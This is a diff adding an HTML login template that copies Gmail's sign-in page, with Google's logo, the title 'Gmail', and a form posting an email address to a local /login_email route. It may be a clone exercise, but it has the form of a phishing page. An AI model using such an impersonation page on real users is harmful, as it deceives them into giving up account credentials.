@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
+    <link rel="icon"
+        href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSU9t9I8gg1rM3EteWYcm1LU8iEabzg6sO_72nr8tP9ppvcnYYAcPlwu7SWejRzcODOHKs&usqp=CAU"
+        type="image/x-icon">
+    <title>Gmail</title>
+</head>
+
+<style>
+    @media (min-width: 576px) {
+        .login_form {
+            border: 1px solid rgb(194, 194, 194);
+            width: 450px;
+            margin-top: 230px;
+            border-radius: 10px;
+        }
+    }
+</style>
+
+<body>
+    <!-- flash message -->
+    {% with messages = get_flashed_messages(with_categories=true) %}
+    {% if messages %}
+    {% for category, message in messages %}
+    <div class="alert alert-{{ category }}">
+        {{ message }}
+    </div>
+    {% endfor %}
+    {% endif %}
+    {% endwith %}
+    <div class="container login_form text-center px-5">
+        <form action="/login_email" method="post">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt=""
+                class="mt-5" width="68px" height="27px">
+            <h3 class="mt-2" style="font-weight: normal;">Sign in</h3>
+            <p style="font-size: 18px; font-weight: 550;">to continue to Gmail</p>
+            <input type="email" style="width: 100%; font-size: 20px;" class="py-2 px-3 mt-3" placeholder="Email" name="login_email" required>
+            <a href="#forget email" style="text-decoration: none; float: left;">Forget Email?</a>
+            <p style="margin-top: 55px; font-size: 14px;">Not your computer? Use Guest mode to sign in privately. <a
+                    href="#learnmore" style="float: left; text-decoration: none; font-size: 16px;">Learn more</a></p>
+            <a class="btn btn-light text-primary" href="/gmail_signup" role="button"
+                style="margin-top: 45px; margin-left: -200px;">Create an account</a>
+            <button class="btn btn-primary px-4" type="submit"
+                style="margin-top: 50px; float: right;">Next</button><br><br><br><br><br>
+        </form>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-U1DAWAznBHeqEIlVSCgzq+c9gqGAJn5c/t99JyeKa9xxaYpSvHU5awsuZVVFIhvj"
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
